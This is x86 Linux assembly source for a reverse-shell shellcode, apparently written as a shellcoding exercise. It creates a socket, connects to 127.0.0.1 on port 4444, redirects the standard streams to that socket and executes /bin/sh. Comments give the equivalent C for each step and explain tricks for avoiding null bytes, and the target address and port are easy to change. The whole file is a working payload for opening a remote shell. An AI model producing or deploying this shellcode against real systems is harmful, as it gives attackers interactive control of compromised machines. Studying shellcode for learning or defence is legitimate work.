section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

sys_socket:
	; {C code} --> int reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the reverse_socket pointer for further usage

sys_connect:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = inet_addr(TARGET);
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> connect(reverse_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 3		; socketcall type - sys_connect

	; pushing the address struct arguments
	push esi		; pushing 0 (null)
	mov ecx, 0x06050584	; moving the 127.0.0.1 address into ECX (reverse order, becouse of nulls, we have to add value 5 in every place...
	sub ecx, 0x05050505	; ... and then substract value 5 from every place
	push ecx		; pushing TARGET address to the stack
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2
	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_connect arguments in reverse order (int reverse_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; reverse_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution
	
sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the reverse_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution

sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
